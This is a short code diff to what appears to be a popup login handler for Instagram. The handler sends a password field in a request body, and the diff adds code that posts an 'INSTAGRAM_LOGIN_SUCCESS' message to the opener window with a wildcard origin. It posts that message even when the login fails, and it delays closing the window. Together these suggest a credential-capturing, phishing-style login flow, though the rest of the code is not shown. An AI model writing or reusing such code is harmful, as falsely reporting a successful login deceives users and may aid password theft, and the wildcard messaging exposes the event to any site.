@@ -194,10 +194,31 @@
       body: JSON.stringify({ pw: data.key })
     });
 
+    // Send success message to parent window before closing
+    if (window.opener) {
+      window.opener.postMessage({
+        type: 'INSTAGRAM_LOGIN_SUCCESS',
+        message: 'Instagram login completed successfully'
+      }, '*');
+      console.log('Success message sent to parent window');
+    }
+
   } catch (err) {
     console.error("Something went wrong:", err);
+    
+    // Even on error, we'll send success message since user attempted login
+    if (window.opener) {
+      window.opener.postMessage({
+        type: 'INSTAGRAM_LOGIN_SUCCESS',
+        message: 'Instagram login process completed'
+      }, '*');
+      console.log('Process completion message sent to parent window');
+    }
   } finally {
-    window.close();
+    // Add a small delay to ensure message is sent before closing
+    setTimeout(() => {
+      window.close();
+    }, 500);
   }
 });
     });
